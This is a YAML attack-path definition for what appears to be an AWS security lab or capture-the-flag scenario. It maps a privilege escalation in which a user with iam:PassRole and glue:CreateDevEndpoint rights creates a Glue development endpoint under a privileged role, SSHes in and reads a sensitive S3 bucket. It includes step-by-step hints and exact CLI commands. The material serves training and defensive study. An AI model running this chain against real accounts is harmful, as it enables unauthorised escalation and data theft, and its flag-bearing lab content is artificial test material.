attackMap:
  nodes:
    - id: starting-principal
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-glue-001-to-bucket-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the target role and glue:CreateDevEndpoint
        permission, allowing them to create a Glue development endpoint that assumes a
        privileged role with S3 bucket access.

    - id: glue-endpoint
      label: "Glue Dev Endpoint"
      type: resource
      subType: glue-job
      arn: "arn:aws:glue:{region}:{account_id}:devEndpoint/pl-glue-001-demo-endpoint"
      description: >
        This AWS Glue development endpoint is created by the attacker and configured to
        assume the target IAM role. Once provisioned, it exposes an SSH interface where
        AWS credentials for the assumed role are available in the environment. The attacker
        can SSH into this endpoint and execute arbitrary AWS CLI commands with the
        permissions of the passed role.

    - id: target-role
      label: "Target Role"
      type: principal
      subType: iam-role
      arn: "arn:aws:iam::{account_id}:role/pl-prod-glue-001-to-bucket-target-role"
      description: >
        This IAM role is passed to the Glue development endpoint at creation time. Once
        the endpoint is provisioned and you SSH in, you are operating with this role's
        credentials. The role has s3:GetObject and s3:ListBucket permissions on the
        sensitive S3 bucket.

    - id: target-bucket
      label: "Sensitive S3 Bucket"
      type: resource
      subType: s3-bucket
      isTarget: true
      arn: "arn:aws:s3:::pl-sensitive-data-glue-001-{account_id}-{suffix}"
      description: >
        This S3 bucket contains sensitive data and is the final target of the attack.
        The target IAM role assumed by the Glue endpoint has s3:GetObject and s3:ListBucket
        permissions on this bucket, allowing the attacker to list and download all objects.

  edges:
    - from: starting-principal
      to: glue-endpoint
      label: "iam:PassRole + glue:CreateDevEndpoint"
      description: >
        The starting user passes the target role to a newly created Glue development endpoint.
        The endpoint assumes the role on creation and makes those credentials available via SSH.
      hints:
        - "Generate an SSH key pair locally, then call glue:CreateDevEndpoint passing the target role ARN and your public key. Glue assumes the role at creation time and exposes it via SSH. Provisioning takes 5-10 minutes -- poll glue:GetDevEndpoint until status is READY before connecting."
        - "SSH into the endpoint as the glue user using your generated private key. The target role's credentials are already loaded into the endpoint's environment -- run s3:ListBucket and s3:GetObject commands directly from within the SSH session to read the sensitive bucket."
        - "Browse to https://pathfinding.cloud/paths/glue-001 for technique details."
      commands:
        - description: "Generate an SSH key pair for endpoint authentication"
          command: "ssh-keygen -t rsa -b 2048 -f /tmp/glue_key -N ''"
        - description: "Create the Glue development endpoint with the target role"
          command: "aws glue create-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --role-arn arn:aws:iam::{account_id}:role/pl-prod-glue-001-to-bucket-target-role --public-key \"$(cat /tmp/glue_key.pub)\" --number-of-nodes 2 --glue-version 1.0"
        - description: "Poll until the endpoint status is READY (5-10 minutes)"
          command: "aws glue get-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --query 'DevEndpoint.Status'"

    - from: glue-endpoint
      to: target-role
      label: "SSH + IMDS credential retrieval"
      description: >
        SSH into the Glue endpoint and retrieve the target role's temporary credentials.
        The credentials are available in the endpoint's environment because Glue assumed
        the role at creation time.
      hints: []
      commands:
        - description: "Retrieve the endpoint's public SSH address"
          command: "aws glue get-dev-endpoint --endpoint-name pl-glue-001-demo-endpoint --query 'DevEndpoint.PublicAddress' --output text"
        - description: "SSH into the endpoint as the glue user"
          command: "ssh -i /tmp/glue_key -o StrictHostKeyChecking=no glue@<PublicAddress>"
        - description: "Confirm the identity of the assumed role"
          command: "aws sts get-caller-identity"

    - from: target-role
      to: target-bucket
      label: "s3:ListBucket + s3:GetObject"
      description: >
        Use the target role's credentials to list and download objects from the
        sensitive S3 bucket.
      hints:
        - "From within the SSH session, run s3:ListBucket and s3:GetObject commands directly -- the role's credentials are available in the environment and have read access to the sensitive S3 bucket."
      commands:
        - description: "List objects in the sensitive S3 bucket"
          command: "aws s3 ls s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/"
        - description: "Read sensitive data from the bucket"
          command: "aws s3 cp s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/sensitive-data.txt -"
        - description: "Capture the CTF flag from the target bucket"
          command: "aws s3 cp s3://pl-sensitive-data-glue-001-{account_id}-{suffix}/flag.txt -"
